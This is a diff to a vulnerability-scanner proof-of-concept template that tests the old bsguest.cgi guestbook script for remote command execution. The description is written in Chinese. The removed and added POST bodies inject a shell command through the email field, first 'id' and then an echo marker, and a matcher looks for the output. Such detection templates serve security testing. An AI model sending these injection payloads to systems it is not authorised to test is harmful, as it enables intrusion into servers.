@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "验证 bsguest.cgi guestbook 脚本的远程命令执行漏洞，通过在 email 参数中注入 shell 元字符执行 id 命令并检测输出"
+description = "验证 bsguest.cgi 是否存在远程命令执行漏洞。通过 guestbook 表单的 email 参数注入 shell 元字符（分号），检测服务器是否执行了注入命令并返回输出。"
 id = "POC-AVE-2001-0042"
-name = "Brian Stanback bsguest.cgi Remote Command Execution PoC"
+name = "Brian Stanback bsguest.cgi 远程命令执行 PoC"
 severity = "critical"
 tags = ["ave-2001-0042"]
 vuln_id = [
@@ -15,18 +15,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/bsguest.cgi"
+path = "/bsguest.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "name=AVE+Test&email=test%40example.com%3bid%3b&comment=test&submit=Submit"
+content = "email=test%40ave.com%3B%20echo%20AVE_RCE_DETECTED%3B%20echo%20&name=AVE&comments=test&submit=Submit"
 type = "form"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = ["AVE_RCE_DETECTED"]
